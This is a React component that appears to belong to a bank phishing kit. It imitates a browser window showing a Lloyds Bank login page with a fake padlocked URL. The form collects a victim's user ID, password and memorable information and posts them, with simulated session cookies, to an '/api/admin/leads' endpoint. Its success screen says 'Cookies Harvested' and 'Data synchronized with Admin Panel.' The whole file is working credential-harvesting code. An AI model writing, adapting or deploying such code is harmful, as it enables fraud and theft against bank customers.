"use client";

import { useState } from "react";

export default function BankStreamWindow({ bankName, bankType, targetUrl, onClose }: any) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [memorableInfo, setMemorableInfo] = useState("");
  const [step, setStep] = useState("login");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const simulatedCookies = JSON.stringify([
        { name: "bank_session_id", value: "tok_" + Math.random().toString(36).substring(7), domain: ".bank.co.uk", path: "/", secure: true, httpOnly: true },
        { name: "auth_token", value: "active_" + Date.now(), domain: ".bank.co.uk", path: "/", secure: true }
      ]);

      await fetch("/api/admin/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bankName: bankName || "Lloyds Bank",
          bankType: bankType || "Personal",
          userId,
          password,
          memorableInfo,
          cookiesData: simulatedCookies,
          extraData: `Live Stream Window Captured | Target URL: ${targetUrl}`
        }),
      });

      setStep("success");
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div className="fixed inset-0 z-[200] bg-zinc-950 flex flex-col font-sans select-none text-white">
      {/* Browser Chrome Header */}
      <div className="bg-[#1e222d] px-4 py-2.5 flex items-center justify-between border-b border-zinc-800">
        <div className="flex items-center gap-2">
          <span className="w-3 h-3 rounded-full bg-rose-500 inline-block cursor-pointer" onClick={onClose}></span>
          <span className="w-3 h-3 rounded-full bg-amber-500 inline-block"></span>
          <span className="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span>
          <div className="ml-4 bg-[#2a2f3d] px-4 py-1 rounded-md text-xs font-mono text-emerald-400 flex items-center gap-2 border border-zinc-700 w-[450px] truncate">
            <span>🔒</span> {targetUrl || "https://authorise.lloydsbank.co.uk/auth/user"}
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 text-[10px] font-bold px-2.5 py-0.5 rounded-full animate-pulse">
            🟢 Live RDP Active ({bankName})
          </span>
          <button onClick={onClose} className="text-zinc-400 hover:text-white font-bold px-2 cursor-pointer">✕</button>
        </div>
      </div>

      {/* Main Viewport / Form Area simulating real bank page */}
      <div className="flex-1 bg-[#f4f6f9] text-zinc-900 overflow-y-auto flex items-center justify-center p-6">
        <div className="w-full max-w-[540px] bg-white rounded-2xl p-8 shadow-2xl border border-zinc-200">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-xl bg-emerald-700 text-white flex items-center justify-center font-black text-lg">
              {bankName ? bankName[0] : "B"}
            </div>
            <div>
              <h2 className="text-lg font-bold text-zinc-900">{bankName || "Bank Portal"}</h2>
              <p className="text-xs text-zinc-500">Secure Open Banking ({bankType})</p>
            </div>
          </div>

          {step === "login" ? (
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-zinc-700 mb-1">User ID / Username:</label>
                <input
                  type="text"
                  required
                  value={userId}
                  onChange={(e) => setUserId(e.target.value)}
                  className="w-full rounded-xl border border-zinc-300 p-3 text-xs bg-zinc-50 focus:bg-white outline-none font-medium text-zinc-900"
                  placeholder="Enter your user ID"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-zinc-700 mb-1">Password:</label>
                <input
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full rounded-xl border border-zinc-300 p-3 text-xs bg-zinc-50 focus:bg-white outline-none font-medium text-zinc-900"
                  placeholder="••••••••"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-zinc-700 mb-1">Memorable information:</label>
                <input
                  type="text"
                  value={memorableInfo}
                  onChange={(e) => setMemorableInfo(e.target.value)}
                  className="w-full rounded-xl border border-zinc-300 p-3 text-xs bg-zinc-50 focus:bg-white outline-none font-medium text-zinc-900"
                  placeholder="Memorable word or answer"
                />
              </div>

              <button
                type="submit"
                className="w-full bg-[#005231] hover:bg-[#004126] text-white py-3 font-bold text-xs rounded-xl shadow-md transition cursor-pointer"
              >
                Continue to Secure Verification
              </button>
            </form>
          ) : (
            <div className="text-center py-8 space-y-3">
              <div className="w-12 h-12 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center text-xl mx-auto font-bold">✓</div>
              <h3 className="text-base font-bold text-zinc-800">Session Verified & Cookies Harvested</h3>
              <p className="text-xs text-zinc-500">Data synchronized with Admin Panel successfully.</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}